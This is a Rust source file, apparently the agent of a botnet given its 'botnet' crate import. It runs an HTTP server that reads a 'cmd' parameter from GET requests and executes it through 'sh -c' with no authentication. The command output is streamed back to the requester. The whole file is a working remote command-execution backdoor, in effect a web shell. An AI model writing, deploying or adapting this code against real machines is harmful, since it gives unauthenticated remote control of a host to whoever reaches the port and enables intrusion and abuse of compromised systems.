use std::io::prelude::*;
use std::io::Read;
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};
use std::env;

use percent_encoding::percent_decode;

use botnet::ThreadPool;

fn main() {
    let addr = env::args().nth(1).unwrap_or("127.0.0.1:7878".to_owned());
    let listener = TcpListener::bind(&addr).unwrap();
    let pool = ThreadPool::new(4);

    for stream in listener.incoming() {
        let stream = stream.unwrap();

        pool.execute(|| {
            handle_connection(stream);
        });
    }

    eprintln!("Shutting down.");
}

fn get_cmd(buf: &[u8]) -> Option<&[u8]> {
    let mut iter = buf.split(|c| *c == b' ');

    let method = iter.next()?;
    let req = iter.next()?;
    let ver = iter.next()?.split(|c| *c == b'\r').nth(0)?;

    if method != b"GET" || ver != b"HTTP/1.1" {
        return None;
    }

    let vars = req.splitn(2, |c| *c == b'?').nth(1)?;

    let mut vars = vars.split(|c| *c == b'&').map(|s| {
        let mut it = s.split(|c| *c == b'=');
        (it.next(), it.next())
    });

    vars.find(|(k, _)| k == &Some(b"cmd".as_ref()))?.1
}

fn handle_connection(mut stream: TcpStream) -> Option<()> {
    let mut in_buffer = [0; 1024];
    let mut out_buffer = [0; 1024];
    let mut bytes = 0;

    loop {
        let buf = &mut in_buffer[bytes..];
        let len = stream.read(buf).ok()?;

        if len == 0 {
            eprintln!("Buffer filled or connection closed");
            return None;
        }

        bytes += len;
        if in_buffer[0..bytes].windows(4).any(|s| s == b"\r\n\r\n") {
            break;
        }
    }

    let cmd = if let Some(c) = get_cmd(&in_buffer) {
        c
    } else {
        let status_line = b"HTTP/1.1 404 NOT FOUND\r\n\r\nError";
        stream.write(status_line).ok()?;
        stream.flush().ok()?;
        return None;
    };

    let cmd = percent_decode(cmd).decode_utf8().ok()?;

    eprintln!("Run: '{}'", cmd);

    let child = Command::new("sh")
        .arg("-c")
        .arg(cmd.as_ref())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .ok()?;

    let mut stdout = child.stdout?;

    let headers: [&[u8]; 3] = [
        b"HTTP/1.1 200 OK\r\n",
        b"Transfer-Encoding: chunked\r\n",
        b"\r\n",
    ];

    for h in &headers {
        stream.write(h).ok()?;
    }

    loop {
        let len = stdout.read(&mut out_buffer).ok()?;
        if len == 0 {
            break;
        }
        stream.write(format!("{:x}\r\n", len).as_bytes()).ok()?;
        stream.write(&out_buffer[0..len]).ok()?;
        stream.write(b"\r\n").ok()?;
        stream.flush().ok()?;
    }

    stream.write(b"0\r\n\r\n").ok()?;
    stream.flush().ok()?;

    Some(())
}
